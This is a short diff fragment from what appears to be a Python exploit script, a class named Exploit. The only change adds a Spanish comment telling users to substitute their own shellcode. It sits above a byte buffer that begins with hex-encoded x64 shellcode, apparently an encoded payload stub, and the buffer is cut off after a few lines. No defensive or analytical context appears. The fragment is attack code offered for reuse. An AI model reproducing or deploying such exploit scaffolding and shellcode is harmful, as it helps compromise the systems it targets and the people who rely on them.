@@ -35,7 +35,7 @@ class Exploit():
   			[in]  int    flags -> 0x00000000
 		);
 		"""
-		
+		# Cambiar a vuestro shellcode
 		buf =  b""
 		buf += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05"
 		buf += b"\xef\xff\xff\xff\x48\xbb\x76\x60\xe1\x0d\x64\x8a\xf9"
